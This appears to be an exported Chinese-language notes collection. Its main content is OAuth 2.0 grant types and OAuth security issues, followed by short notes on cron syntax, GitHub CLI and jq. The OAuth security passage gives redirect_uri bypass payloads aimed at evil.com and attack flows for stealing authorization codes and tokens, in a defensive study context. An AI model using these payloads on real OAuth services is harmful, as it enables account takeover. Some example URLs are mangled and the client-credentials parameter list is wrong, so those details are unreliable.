一类的机制，来区分请求来自谁，来自哪里。\n\nOAuth 下的安全问题\n\n缺少 state 参数，或者 state 参数是固定可猜测的从而导致 OAuth 下的 CSRF 问题。\nredirect_uri 的绕过，如果 redirect_uri 可控，那么意味着可以获取 access_token。一般 redirect_uri 都会有过滤机制，可能的绕过方式\n\n开放重定向：yourtweetreader.com/callback://evil.com\n目录遍历：yourtweetreader.com/callback/../redirect://evil.com，需要目标站点有一个带有重定向功能的接口 redirect。\n不安全的 redirect_uri 正则匹配：yourtweetreader.com.evil.com\n通过 HTML 注入，借助 Referer 字段获取请求内容 yourtweetreader.com/callback/home/attackerimg.jpg\n\n\nPre Account Takeover，如果目标站点有一个注册功能，但是这个注册功能并不会验证邮箱的有效性。如果攻击者在用户之前通过该邮箱进行注册，当用户下次访问这个客户端应用时，选择通过社交账号登陆，并关联邮箱时，发现已经注册过了就好把这个账号和社交账号绑定至一起。\nclient_id 和 client_secret 的泄露，特别是 client_secret 的泄露，攻击者可以伪装成客户端应用，完成正常绑定的所有步骤从而窃取用户信息。\n\nImplicit Grant Attacks\n一种最糟糕的情况，如果用户已经登陆过 AuthServer，且给于了授权。若攻击者知晓 client_id 和 client_secret。\n那么可以构造如下的恶意请求并欺骗用户点击，让 redirect_uri 指向攻击者地址『对应步骤 3』，这样攻击者可以得知 AuthServer 返回的 code 甚至 token。\nauthserver.com/oauth/authorize://dsyer.github.com/spring-security-oauth/attack.html&amp;scope=read\n\n对于这种方式，AuthServer 应当验证 client_id 与 redirect_uri 的关联性，确保 redirect_uri 指向的是 Client 注册时指定的 URL。\nAuthorization Code Attacks\n此类攻击尝试获取用户的授权码，攻击者首先构造恶意链接让用户点击来触发请求。它有一个前置条件，攻击者需要知道被攻击目标的 client_secret。\n下面是对应的攻击时序图\n@startuml\nskinparam Shadowing true\nskinparam sequenceMessageAlign direction\nparticipant User\nparticipant BadClient\nparticipant AuthServer\n \nUser -&gt; AuthServer: &quot;GET /authorize?client_id=good&amp;redirect_uri=bad/peek&amp;state=pololu&quot;\nactivate User\nactivate AuthServer\n \nAuthServer -&gt; User: &quot;302: Location=/bad/peek?code=code&amp;state=pololu&quot;\ndeactivate User\ndeactivate AuthServer\n \nUser -&gt; BadClient: &quot;GET /peek?code=code&amp;state=pololu&quot;\nactivate User\nactivate BadClient\n \nBadClient -&gt; AuthServer: &quot;POST /token?code=code&amp;state=pololu&quot;\nnote right of BadClient\nAssume BadClient knows \nclient secret\nend note\nAuthServer -&gt; BadClient: &quot;200: {access_token:token}&quot;\n \ndeactivate BadClient\ndeactivate User\n@enduml\n假设攻击者知道了 client_id 和 client_secret，构造如下请求\nauthserver.com/oauth/authorize://dsyer.github.com/bad/peek&amp;scope=read\n\n用户点击后，重定向至攻击者控制的 Client，此时攻击者可通过 client_secret 获取 token。\nCSRF Attacks\nCSRF 攻击能够用于改变 Client 的状态，如果 Client 没有维护和验证 User 的状态『例如不确定 code 是否为当前用户的，当前请求是否来自用户』，则会受到 CSRF 的影响。单纯的 CSRF 并没有办法直接窃取 token，但可能会改变用户在 Client 中的状态，例如将用户绑定至攻击者的在 AuthServer 中的账号。\n下面的时序图展示了通过 state 参数来防护 CSRF 攻击的过程。\n@startuml\nskinparam Shadowing true\nskinparam sequenceMessageAlign direction\nparticipant User\nparticipant Client\nparticipant AuthServer\nparticipant Session\nparticipant ResourceServer\nUser -&gt; Client: &quot;GET /peek&quot;\nactivate User\nactivate Client\n \nnote right of Client: generate random key for state\nClient -&gt; Session : &quot;store: {request:/peek, pololu:random_key}&quot;\nactivate Session\n \nClient -&gt; User : &quot;302: Location=auth/authorize?state=pololu&quot;\ndeactivate Client\ndeactivate User\n \nUser -&gt; AuthServer: &quot;GET /authorize?state=pololu&quot;\nactivate User\nactivate AuthServer\nAuthServer -&gt; User: &quot;302: Location=clien/handle_code?code=random_code&amp;state=pololu&quot;\ndeactivate User\ndeactivate AuthServer\n \nUser -&gt; Client: &quot;GET /handle_code?code=random_code&amp;state=pololu&quot;\nactivate User\nactivate Client\n \nnote left of Client: check state\nClient -&gt; Session: &quot;get pololu&quot;\nSession -&gt; Client: &quot;random_key&quot;\nnote left of Client: OK(state exists)\n \nClient -&gt; AuthServer: &quot;POST: /token?code=random_code&quot;\nactivate AuthServer\nAuthServer -&gt; Client: &quot;200: {access_token:random_token}&quot;\ndeactivate AuthServer\n \nClient -&gt; Session: &quot;get request&quot;\nSession -&gt; Client: &quot;get /peek&quot;\nnote left of Client: continue with /peek\n \nClient -&gt; ResourceServer: &quot;GET /resource?access_token=random_token&quot;\nactivate ResourceServer\nResourceServer -&gt; Client: &quot;200: response&quot;\ndeactivate ResourceServer\n \nClient -&gt; User: &quot;200: result&quot;\ndeactivate User\ndeactivate Client\n \n@enduml\n防护策略\n要防止这样的攻击其实很容易，作为第三方应用的开发者，只需在 OAuth 认证过程中加入 state 参数，并验证它的参数值即可。具体细节如下：\n\n在将用户重定向到 OAuth2 的 Authorization Endpoint 去的时候，为用户生成一个随机的字符串，并作为 state 参数加入到 URL 中。\n在收到 OAuth2 服务提供者返回的 Authorization Code 请求的时候，验证接收到的 state 参数值。如果是正确合法的请求，那么此时接受到的参数值应该和上一步提到的为该用户生成的 state 参数值完全一致，否则就是异常请求。\nstate 参数值需要具备下面几个特性：\n\n不可预测性：足够的随机，使得攻击者难以猜到正确的参数值\n关联性：state 参数值和当前用户会话（user session）是相互关联的\n唯一性：每个用户，甚至每次请求生成的 state 参数值都是唯一的\n时效性：state 参数一旦被使用则立即失效\n\n\n\nSSRF via OpenID\nOpenID 是针对 OAuth 开发的拓展机制，用于规范化使用 OAuth 进行身份认证的过程。\n\nOAuth 的设计初衷只是为了进行授权，Client 并不知道用户『资源所有者』在 OAuth 认证服务器上何时何地如何进行认证的。\n\nOpenID 中有部分个术语，它们与 OAuth 中的术语有一定的对应关系\n\nRelying party- 请求用户身份验证的应用程序，等价于 OAuth 中的 Client；\nEnd user- 正在接受身份认证的用户，等价于 OAuth 中的资源所有者；\nOpenID provider- 配置为支持 OpenID Connect 的 OAuth 服务。\n\nOpenID 中还有一个概念，叫 claims，它是一个键值对，用于表示用户的身份信息，例如 &quot;family_name&quot;:&quot;Montoya&quot;。\n此外 OpenID 在 OAuth 之上定义 4 种标准 scope 类型，每一种类型表示所需读取的与用户相关的 claims 信息，可以同时指定多个，空格分隔\n\nprofile：identify 信息\nemail\naddress\nphone\n\nGET /auth?client_id=h82l3xtkcwuja5fv1iiiy&amp;redirect_uri=0ad700bc0475d06b856b554500db00c4.web-security-academy.net/oauth-callback&amp;response_type=code&amp;scope=openid%20profile%20email HTTP/1.1\n以及 1 种 response 类型\n\nid_token\n\nid_token 的标准形式是经过 Json Web Signature(JWS) 签名的 Json Web Token(JWT)。通常来讲，可以访问 OAuth 提供者的路由 /.well-known/openid-configuration 来查看相关配置。\n而 OpenID 中引入了一个标准，允许 Client 向 OpenID 提供商进行注册的标准化方法，在注册时要求 Client 认证它自身的身份。下面是一个示例请求\nPOST /openid/register HTTP/1.1\nContent-Type: application/json\nAccept: application/json\nHost: oauth-authorization-server.com\nAuthorization: Bearer ab12cd34ef56gh89\n \n{\n    &quot;application_type&quot;: &quot;web&quot;,\n    &quot;redirect_uris&quot;: [\n        &quot;client-app.com/callback&quot;,\n        &quot;client-app.com/callback2&quot;\n        ],\n    &quot;client_name&quot;: &quot;My Application&quot;,\n    &quot;logo_uri&quot;: &quot;client-app.com/logo.png&quot;,\n    &quot;token_endpoint_auth_method&quot;: &quot;client_secret_basic&quot;,\n    &quot;jwks_uri&quot;: &quot;client-app.com/my_public_keys.jwks&quot;,\n    &quot;userinfo_encrypted_response_alg&quot;: &quot;RSA1_5&quot;,\n    &quot;userinfo_encrypted_response_enc&quot;: &quot;A128CBC-HS256&quot;,\n    …\n}\n而如果 OpenID 提供商允许无需认证的动态 Client 注册，则可能引发一些安全问题。而注册操作中的参数涉及到多个 URL，若是 OpenID 提供商在访问这些 URL 时处理不当则会导致 SSRF 漏洞，见 Lab 5 - SSRF via OpenID Dynamic Client Registration。\nAbusing OAuth\n由于 Fackbook『其它 OAuth 认证提供者可能也有类似问题』 默认不主动对 Token 进行验证，若 Client 没有自行验证，则可能导致用户账号被窃取。具体见 OAuth - Abusing OAuth to take over millions of accounts。\nPKCE\nPKCE 是 OAuth 的一个拓展，PKCE 借助哈希算法的不可逆的特性，来验证授权码的唯一性和关联性。可使用 PKCE 保护授权码，防范 CSRF 和授权码注入攻击。\nPlayground\n\n\n                  \n                  Info\n                  \n                \n可通过 OAuth 的示例 www.oauth.com/playground/authorization-code-with-pkce.html 了解 PKCE 的流程。\n\n注册\n\nclient_id：mEwZJp0AN5k5rTq-rMCB1toG\nclient_secret：7y8nyD57kCG_K9DZbGf-xS2RvNrHIKl9ptxMzKp4PNoGPpyG\nlogin：crowded-deer@example.com\npassword：Calm-Flamingo-41\n\n重定向前的准备\nClient 将用户重定向至 OAuth 认证服务器前，生成一个 secret code verifier 和 challenge，前者字母、数字、标点符号『-._~』组成，长度介于 40-128；后者在 Client 支持 SHA256 的情况下，对 code verifier 进行 SHA256-BASE64-URl 3 重编码，否则直接使用 code verifier 作为 challenge。\n例如对于如下 code verifier，\nZU7Sg87rWCWqNKFPz_RzdUoG9TUkVRKam4WyBALkksVDAeo8\n\n生成 challenge=base64url(sha256(code_verifier))，\npDEnD7FW5vyK22pmKxsdwb_O810Vl3eH2fTzzd4arns\n\nClient 保存 code verifier 供后续使用，例如存放在 cookie 中。同时，Client 需要生成一个随机的 state 参数，同样的可以选择存放在 cookie 中。最后返回给用户的重定向 URL 如下，其中携带 code_challenge 和 state\nauthorization-server.com/authorize\n  response_type=code\n  &amp;client_id=mEwZJp0AN5k5rTq-rMCB1toG\n  &amp;redirect_uri=www.oauth.com/playground/authorization-code-with-pkce.html\n  &amp;scope=photo+offline_access\n  &amp;state=IVgHkilS32JLrf70\n  &amp;code_challenge=pDEnD7FW5vyK22pmKxsdwb_O810Vl3eH2fTzzd4arns\n  &amp;code_challenge_method=S256\n\n验证 State\n用户根据重定向 URL 访问 OAuth 授权服务器后，会带回如下参数访问 Client。这里 state 和 code 都具有防护 CSRF 的功能，在实际应用中，如果支持 PKCE，可以使用 state 来表示应用的其它状态。\n?state=IVgHkilS32JLrf70&amp;code=1kC7qeB4VpGn1i0HKIA0U30GPcOhz_BVMxtkkf3hu8t2rgf4\n\n接着要 Client 使用 code 与 OAuth 授权服务器交换 access_token 了，在使用 PKCE 的情况下，Client 会带上参数 code_verifier。授权服务器会对 code_verifier 计算一次哈希，并判断它与最初接收到的 code_challenge 是否相同，通过了该挑战才会返回 token。\nPOST authorization-server.com/token\n\tgrant_type=authorization_code\n\t&amp;client_id=mEwZJp0AN5k5rTq-rMCB1toG\n\t&amp;client_secret=7y8nyD57kCG_K9DZbGf-xS2RvNrHIKl9ptxMzKp4PNoGPpyG\n\t&amp;redirect_uri=www.oauth.com/playground/authorization-code-with-pkce.html\n\t&amp;code=1kC7qeB4VpGn1i0HKIA0U30GPcOhz_BVMxtkkf3hu8t2rgf4\n\t&amp;code_verifier=ZU7Sg87rWCWqNKFPz_RzdUoG9TUkVRKam4WyBALkksVDAeo8\n\n验证 Code\nOAuth 使用 code_verifier 完成 challenge 后，才会返回 access_token\n\n由于 code_verifier 每一次都是独立随机的，即使前面的请求被伪造，由于不知道 code_verifier，攻击者无法完成 CSRF 攻击。\n\n{\n  &quot;token_type&quot;: &quot;Bearer&quot;,\n  &quot;expires_in&quot;: 86400,\n  &quot;access_token&quot;: &quot;XWLW_BFt6komy57NpPKHyEqFZyiJG12bNpSh23tyBLBI1Ok_D-r5BZxjZIamKZY8DjIPT2rJ&quot;,\n  &quot;scope&quot;: &quot;photo offline_access&quot;,\n  &quot;refresh_token&quot;: &quot;acyLSsgyi-M5DAWoj12zg3uV&quot;\n}\n\n时序图\n以下为 PKCE 的挑战时序图\n@startuml\nskinparam Shadowing true\nskinparam sequenceMessageAlign direction\nparticipant User\nparticipant Client\nparticipant AuthServer\n \nUser -&gt; Client: &quot;GET /peek&quot;\nactivate User\nactivate Client\n \nnote left of Client\ngenerate code verifier and challenge,\nand send the challenge\nend note\nClient -&gt; User: &quot;302 Location: GET /auth?response_type=code&amp;state=pololu&amp;code_challenge=&amp;code_challenge_method=S256&quot;\ndeactivate User\n \nUser -&gt; AuthServer: &quot;GET /auth?response_type=code&amp;state=pololu&amp;code_challenge=&amp;code_challenge_method=S256&quot;\nactivate User\nactivate AuthServer\nAuthServer -&gt; User: &quot;302 Location: GET /client/handle_code?state=pololu&amp;code=code&quot;\ndeactivate User\ndeactivate AuthServer\n \nUser -&gt; Client: &quot;GET /client/handle_code?state=&lt;state&gt;&amp;code=&lt;code&gt;&quot;\nactivate User\nClient -&gt; AuthServer: &quot;POST /token?code=code&amp;code_verifier=code_verifier&quot;\nnote left of AuthServer: use the code_verifier to complete the challenge\nactivate AuthServer\nAuthServer -&gt; Client: &quot;200 token&quot;\ndeactivate AuthServer\n \nClient -&gt; User: &quot;200: result&quot;\ndeactivate Client\ndeactivate User\n@enduml\n参考\n\nspring.io/blog/2011/11/30/cross-site-request-forgery-and-oauth2\nsalt.security/blog/traveling-with-oauth-account-takeover-on-booking-com\nwww.oauth.com/playground/authorization-code-with-pkce.html 『Playground: Authorization Code with PKCE』\n"},"articles/security/web/oauth/OAuth":{"title":"OAuth - 简介","links":["journals/2022/10---October/24---Monday/OAuth-2-and-Fragment-encoding"],"tags":["oauth"],"content":"OAuth 是一种开放授权标准，目前广泛使用的版本为 2.0，主要用于解决第三方应用以用户身份访问其它资源的问题。\n例如你在 github 拥有账号，通过 oauth 授权 synk 扫描在 github 上的仓库，特别是私有仓库。\n概念定义\nRFC6749 文档中将整个授权过程的参与者抽象成了 3 类，资源所有者（Resource Owner）、客户端（Client）和认证服务器（Authorization Server）\n\nClient：指第三方应用\nResource Owner：指用户\nAuthorization Server：指 OAuth 认证和授权服务提供者\nResource server：资源服务器，即服务提供商存放用户生资源的服务器。它与认证服务器，可以是同一台服务器，也可以是不同的服务器『位于内部网络』。\n\n下图展示了通过 OAuth 进行授权的例子\n\nOAuth 2.0 定义了四种授权方式，上图展示的是 implicit 模式。\n\n授权码模式（authorization code）\n简化模式（implicit）\n密码模式（resource owner password credentials）\n客户端模式（client credentials）\n\n授权方式\nAuthorization Code\n最完善的模式，也是相对最安全的模式。该模式下第三方应用先申请一个验证码，然后再用该验证码获取访问令牌。\n它的工作流程如下：\n\n用户访问客户端，客户端将用户重定向至目标服务器，例如前面的 google。\n用户根据重定向的地址，访问并登录 goole，选择是否给予客户端授权。\n假设用户给予授权，google 会让用户重定向至客户端，重定向的 URL 包含一个授权码。\n客户端收到授权码，携带 client_id 和 client_secret，向认证服务器申请令牌。这一步是在客户端的后台的服务器上完成的，对用户不可见。\n认证服务器核对了授权码和 client_id 和 client_secret，确认无误后，向客户端发送访问令牌（access token）和更新令牌（refresh token），后续如果令牌到期，客户端可以使用更新令牌从认证服务器获取新的访问令牌。\n\n各个步骤所需要的参数如下\n步骤 1 中，客户端申请认证的 URI，包含以下参数：\n\nresponse_type：表示授权类型，必选项，授权码模式下固定为 “code”。\nclient_id：表示客户端的 ID，必选项。\nredirect_uri：表示重定向 URI，可选项。\nscope：表示申请的权限范围，可选项。\nstate：表示客户端的当前状态，可以指定任意值，认证服务器会原封不动地返回这个值。这个 state 相当于一个 csrf token。\n\nGET /authorize?response_type=code&amp;client_id=s6BhdRkqt3&amp;state=xyz&amp;redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb HTTP/1.1\nHost: server.example.com\n步骤 3 中，服务器响应客户端的 URI，包含以下参数：\n\ncode：表示授权码，必选项。该码的有效期应该很短，通常设为 10 分钟，客户端只能使用该码一次，否则会被授权服务器拒绝。该码与客户端 ID 和重定向 URI，是一一对应关系。\nstate：如果客户端的请求中包含这个参数，认证服务器的回应也必须一模一样包含这个参数。\n\nHTTP/1.1 302 Found\nLocation: client.example.com/cb\n          &amp;state=xyz\n步骤 4 中，客户端向认证服务器申请令牌的 HTTP 请求，包含以下参数：\n\ngrant_type：表示使用的授权模式，必选项，此处的值固定为 “authorization_code”。\ncode：上一步获取的授权码，必选项。\nredirect_uri：表示重定向 URI，必选项，且必须与 A 步骤中的该参数值保持一致。\nclient_id：表示客户端 ID，必选项。\nclient_secret：表示客户端密钥，必选项\n\nPOST /token HTTP/1.1\nHost: server.example.com\nAuthorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW\nContent-Type: application/x-www-form-urlencoded\n \ngrant_type=authorization_code&amp;code=SplxlOBeZQQYbYS6WxSbIA\n&amp;redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb&amp;client_id=CLIENT_ID&amp; client_secret=CLIENT_SECRET\n步骤 5 中，认证服务器发送的 HTTP 响应，包含以下参数：\n\naccess_token：表示访问令牌，必选项。\ntoken_type：表示令牌类型，该值大小写不敏感，必选项，可以是 bearer 类型或 mac 类型。\nexpires_in：表示过期时间，单位为秒。如果省略该参数，必须其他方式设置过期时间。\nrefresh_token：表示更新令牌，用来获取下一次的访问令牌，可选项。\nscope：表示权限范围，如果与客户端申请的范围一致，此项可省略。\n\nHTTP/1.1 200 OK\nContent-Type: application/json;charset=UTF-8\nCache-Control: no-store\nPragma: no-cache\n \n{\n    &quot;access_token&quot;:&quot;2YotnFZFEjr1zCsicMWpAA&quot;,\n    &quot;token_type&quot;:&quot;example&quot;,\n    &quot;expires_in&quot;:3600,\n    &quot;refresh_token&quot;:&quot;tGzv3JOkF0XG5Qx2TlKWIA&quot;,\n    &quot;example_parameter&quot;:&quot;example_value&quot;\n}\n从上面代码可以看到，相关参数使用 JSON 格式发送（Content-Type: application/json）。此外，HTTP 头信息中明确指定不得缓存。当然，这只是标准中规定的，具体情况需要看实现。\nImplicit\n前面的 Authorization Code 模式，需要客户端有后端服务器。对于无后端的应用进行授权则需要使用 Implicit 模式。简化模式将客户端和认证服务器的通信过程，放到了 User-Agent（用户） 中进行。跳过了『授权码』这个步骤，但也带来了一定的安全风险。\n在前面的模式下，User-Agent 先将 Authorization Code 交给 Client，Client 再根据此 Code 去获取 Access Code。而此模式下，略过了第一步，当用户通过 User-Agent 访问认证服务后，直接得到 Access Code 并交给 Client。\n它的工作流程如下：\n\n客户端将用户重定向认证服务器。\n用户决定是否给于客户端授权。\n假设用户给予授权，认证服务器将用户导向客户端指定的『重定向 URL』，并在 URL 中包含了一个访问令牌，位于 Fragment 中。\nUser-Agent 根据重定向请求访问 Web-Hosted Client Resource，此时不会带上前一步 Fragment 中的访问令牌。\nUser-Agent 获取包含 Script 的响应内容，这个 Script 能够获取步骤 C 中位于 Fragment 中的访问令牌。\nUser-Agent 执行 Script 获取访问令牌。\nUser-Agent 将访问令牌发送给 Client。\n\n\n\n                  \n                  Tip\n                  \n                \n注意，步骤 3 返回的令牌的位置是 URL 锚点（fragment），而不是查询字符串（querystring），这是因为 OAuth 2.0 允许跳转网址是 HTTP 协议，因此存在 ” 中间人攻击 ” 的风险，而浏览器跳转时，锚点不会发到服务器，只能在本地（User-Agetn）获取，就减少了泄漏令牌的风险。\n\n各个步骤所需要的参数如下\n步骤 1 中，客户端发出的 HTTP 请求，包含以下参数：\n\nresponse_type：表示授权类型，此验证模式下值固定为『token』，必选项。\nclient_id：表示客户端的 ID，必选项。\nredirect_uri：表示重定向的 URI，可选项。\nscope：表示权限范围，可选项。\nstate：表示客户端的当前状态，可以指定任意值，认证服务器会原封不动地返回这个值。\n\nGET /authorize?response_type=token&amp;client_id=s6BhdRkqt3&amp;state=xyz\n    &amp;redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb HTTP/1.1\nHost: server.example.com\n步骤 3 中，认证服务器响应应客户端的 URL，包含以下参数：\n\naccess_token：表示访问令牌，必选项。\ntoken_type：表示令牌类型，该值大小写不敏感，必选项。\nexpires_in：表示过期时间，单位为秒。如果省略该参数，必须其他方式设置过期时间。\nscope：表示权限范围，如果与客户端申请的范围一致，此项可省略。\nstate：如果客户端的请求中包含这个参数，认证服务器的回应也必须一模一样包含这个参数。\n\n但这些参数都位于 # 后面，也就是 Fragment 中。\nHTTP/1.1 302 Found\nLocation: example.com/cb#access_token=2YotnFZFEjr1zCsicMWpAA\n          &amp;state=xyz&amp;token_type=example&amp;expires_in=3600\n根据上面的步骤 4，下一步浏览器会访问 Location 指定的 URL，但不会带上 Fragment 。访问后，Web-Hosted Client Resource 返回解析代码用于从步骤 4 获取的 URL 中出 Fragment 中的令牌。最后在 6 步骤中，将令牌交给 Client。\n至于为什么将返回到 token 等信息放在 Fragment 中，主要原因有下面 3 个 OAuth 2 and Fragment encoding.：\n\n这种方式对于 JS 环境下的 Client 而言（User-Agent，如浏览器）可以很方便的获取响应中的内容，节省操作次数。\n此方式相比 Post 而言，不会在 Referrer 字段中泄露信息。\nFragment 在重定向时，不会被包含在请求的 URL 中。（不过现在的浏览器不一定会准守该行为准则）。\n\n\n\n                  \n                  Info\n                  \n                \n至于为什么标准中假定解析 Fragment 的脚本放在 Web-Hosted Client Resource，没有找到具体这么做的解释。这里只找到一个 回答，但解释的也不够详细\n\nPassword Credentials\nPassword Credentials 模式与其它授权方式不同的是，它直接返回用户的账号和密码给客户端。\n\n\n                  \n                  Info\n                  \n                \n除非非常信任目标客户端，否则不要这么做。\n\n它的工作流程如下：\n\n客户端向用户索取认证服务器所需的用户名和密码。\n客户端携带用户名和密码从认证服务器请求令牌。\n\n步骤 2 中，客户端向认证服务器发送的请求包含以下参数：\n\ngrant_type：表示使用的授权模式，必选项，此处的值固定为『password』。\nusername：上一步获取的用户名，必选项。\npassword：上一步获取的密码，必选项。\nclient_id：表示客户端 ID，必选项。\n\nGET /authorize?grant_type=password&amp;username=USERNAME&amp;password=PASSWORD&amp;client_id=CLIENT_ID HTTP/1.1\nHost: server.example.com\nClient Credentials\nClient Credentials 模式，这种模式适合没有前端的控制台应用。\n它的工作流程如下：\n\n控制台应用向认证服务器发送授权请求。\n认证服务器验证后直接返回令牌。\n\n注意上面的交互过程不需要『用户参与』，该模式通常适用于第三方应用访问它自己的所属的资源。\n步骤 1 中，客户端向认证服务器发送的请求包含以下参数：\n\ngrant_type：表示使用的授权模式，必选项，此处的值固定为『password』。\nusername：上一步获取的用户名，必选项。\npassword：上一步获取的密码，必选项。\nclient_id：表示客户端 ID，必选项。\nscope：表示权限范围，可选项。\n\nGET /authorize?grant_type=client_credentials&amp;client_id=CLIENT_ID&amp;client_secret=CLIENT_SECRET HTTP/1.1\nHost: server.example.com\n步骤 2 中，认证服务器的响应格式为 json，包含以下字段：\n\naccess_token：表示访问令牌，必选项。\ntoken_type：表示令牌类型，该值大小写不敏感，必选项，可以是 bearer 类型或 mac 类型。\nexpires_in：表示过期时间，单位为秒。如果省略该参数，必须其他方式设置过期时间。\nrefresh_token：表示更新令牌，用来获取下一次的访问令牌，可选项。\nscope：表示权限范围，如果与客户端申请的范围一致，此项可省略。\n\n代码示例\n这里可以参考 ruanyifeng 博客中的示例代码，上手体验通过 OAuth 进行授权。\nReference\n\n理解OAuth 2.0 - 阮一峰的网络日志 (ruanyifeng.com)\nOAuth 2.0 — OAuth\nOAuth 2.0 authentication vulnerabilities | Web Security Academy (portswigger.net)\nOAuth grant types | Web Security Academy (portswigger.net)\nRFC Reader - An online reader for IETF RFCs\n"},"articles/security/安全会议":{"title":"安全会议","links":[],"tags":[],"content":"技术\n\nBlack Hat | Home\nDEF CON® Hacking Conference Home\nXCon\nKCon 黑客大会 - kcon.knownsec.com\nHITBC\n"},"articles/tech/Cron-语法":{"title":"Cron 语法","links":[],"tags":[],"content":"在类 Unix 系统下可使用 cron 命令设定定时任务，该工具遵循 cron 语法。\ncron 语法一共包含 5 个字短，由空格分开，每个字段表示时间单元\n┌───────────── minute (0 - 59)\n│ ┌───────────── hour (0 - 23)\n│ │ ┌───────────── day of the month (1 - 31)\n│ │ │ ┌───────────── month (1 - 12 or JAN-DEC)\n│ │ │ │ ┌───────────── day of the week (0 - 6 or SUN-SAT)\n│ │ │ │ │\n│ │ │ │ │\n│ │ │ │ │\n* * * * *\n\n可以使用 crontab guru 来帮助设置 cron 语法字符串，或参考 crontab guru examples。\n这 5 个字段中可以都使用以下字符\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nOperatorDescriptionExample*Any value15 * * * * runs at every minute 15 of every hour of every day.,Value list separator2,10 4,5 * * * runs at minute 2 and 10 of the 4th and 5th hour of every day.-Range of values30 4-6 * * * runs at minute 30 of the 4th, 5th, and 6th hour./Step values20/15 * * * * runs every 15 minutes starting from minute 20 through 59 (minutes 20, 35, and 50)."},"articles/tech/Github-CLI--使用":{"title":"Github CLI  使用","links":["articles/tech/Jq-使用手册"],"tags":[],"content":"GitHub CLI 或简称 gh，是 Github 推出的控制台应用，用于管理和操作 Gtihub 上的内容，可以理解为控制台版的 GitHub。Mac 下的安装，\nbrew install gh\n其它平台见文档 GitHub - cli/cli: GitHub’s official command line tool\n配置\n首次使用需要进行登陆授权，登陆账户有两类，Personal 和 Enterprise，下面仅展示个人用户的登录过程，企业用户见文档 Manual | GitHub CLI\ngh auth login\n\n\n设置默认编辑器\ngh config set editor nvim\n常用操作\n拉取仓库\n根据 OWNER/REPO\ngh repo clone cli/cli\nCloning into &#039;cli&#039;...\n或 URL\ngh repo clone github.com/cli/cli\n\n创建仓库\n创建名为 my-project 的公有仓库并克隆到本地\ngh repo create my-project --public --clone\n操作 REST API\ngh 工具可以使用 api 命令与访问 GitHub REST API，使用方式如下\ngh api &lt;endpoint&gt; [flags]\n指定请求头\n以 api.github.com/users/{username}/starred 为例，该接口会返回指定用户 starred 的仓库列表，可通过 -H 指定请求头。\ngh api \\\n  -H &quot;Accept: application/vnd.github+json&quot; \\\n  -H &quot;X-GitHub-Api-Version: 2022-11-28&quot; \\\n  /users/USERNAME/starred\n指定请求方法和参数\n该接口有一个 GET 参数 per_page，指定每次返回仓库的个数，最大为 100，可通过 -X 指定请求方法，-f 指定请求参数『如果为 POST 请求，参数会放在请求体中』。\ngh api \\\n  -X GET \\\n  -H &quot;Accept: application/vnd.github+json&quot; \\\n  -H &quot;X-GitHub-Api-Version: 2022-11-28&quot; \\\n  -f &quot;per_page=100&quot; \\\n  /users/USERNAME/starred\n如果需要请求更多的内容，比如所有 starred 的参考『个数超过 100』，则还可以使用 --paginate 参数，表示请求全部内容，数据会以多个数组的形式返回。\ngh api \\\n  -X GET \\\n  -H &quot;Accept: application/vnd.github+json&quot; \\\n  -H &quot;X-GitHub-Api-Version: 2022-11-28&quot; \\\n  -f &quot;per_page=100&quot; \\\n  users/${USER}/starred \\\n  --paginate\n查看响应头\n此外可以通过 -i 参数查看相应头\ngh api \\\n  -X GET \\\n  -H &quot;Accept: application/vnd.github+json&quot; \\\n  -H &quot;X-GitHub-Api-Version: 2022-11-28&quot; \\\n  -f &quot;per_page=1&quot; \\\n  -i \\\n  /users/USERNAME/starred\n响应内容如下\nHTTP/2.0 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Expose-Headers: ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Resource, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, X-GitHub-SSO, X-GitHub-Request-Id, Deprecation, Sunset\nCache-Control: private, max-age=60, s-maxage=60\nContent-Security-Policy: default-src &#039;none&#039;\nContent-Type: application/json; charset=utf-8\nDate: Tue, 02 May 2023 10:03:25 GMT\nEtag: W/&quot;2e49d7288d5626553c400084fcde370dc7f128420f0700dc170d2fc841320dc5&quot;\nLink: &lt;api.github.com/user/62204882/starred rel=&quot;next&quot;, &lt;api.github.com/user/62204882/starred rel=&quot;last&quot;\nReferrer-Policy: origin-when-cross-origin, strict-origin-when-cross-origin\nServer: GitHub.com\nStrict-Transport-Security: max-age=31536000; includeSubdomains; preload\nVary: Accept, Authorization, Cookie, X-GitHub-OTP, Accept-Encoding, Accept, X-Requested-With\nX-Accepted-Oauth-Scopes:\nX-Content-Type-Options: nosniff\nX-Frame-Options: deny\nX-Github-Api-Version-Selected: 2022-11-28\nX-Github-Media-Type: github.v3; format=json\nX-Github-Request-Id: 5B3E:4B0B:1199179:123DCC4:6450DFED\nX-Oauth-Client-Id: 178c6fc778ccc68e1d6a\nX-Oauth-Scopes: gist, read:org, repo, workflow\nX-Ratelimit-Limit: 5000\nX-Ratelimit-Remaining: 4993\nX-Ratelimit-Reset: 1683021990\nX-Ratelimit-Resource: core\nX-Ratelimit-Used: 7\nX-Xss-Protection: 0\n此外可以配合 --jq 参数，使用 jq 语法来操作 json 数据，同时可以参考 Jq 使用手册。另外 gh 还支持通过 golang 的模版来自定义输出数据的格式，具体使用方式参考 gh help formatting。\ngh api \\\n  -X GET \\\n  -H &quot;Accept: application/vnd.github+json&quot; \\\n  -H &quot;X-GitHub-Api-Version: 2022-11-28&quot; \\\n  -f &quot;per_page=1&quot; \\\n  -i \\\n  /users/USERNAME/starred \\\n  --template \\\n    &#039;{{range .}}{{.id}} ({{.full_name | pluck &quot;name&quot; | join &quot;, &quot; | color &quot;yellow&quot;}}){{&quot;\\n&quot;}}{{end}}&#039;\n\n若需使用 GraphQL 语法，需要配合使用 graphql 命令。\n"},"articles/tech/Jq-使用手册":{"title":"Jq 使用手册","links":[],"tags":[],"content":"查询内容的长度\njq 内嵌了 length 方法，对于不同的元素会返回不同的值：\n\n字符串：返回字符个数\n数组：返回数组长度\n对象：返回对象 key-map 的个数\nnull：返回 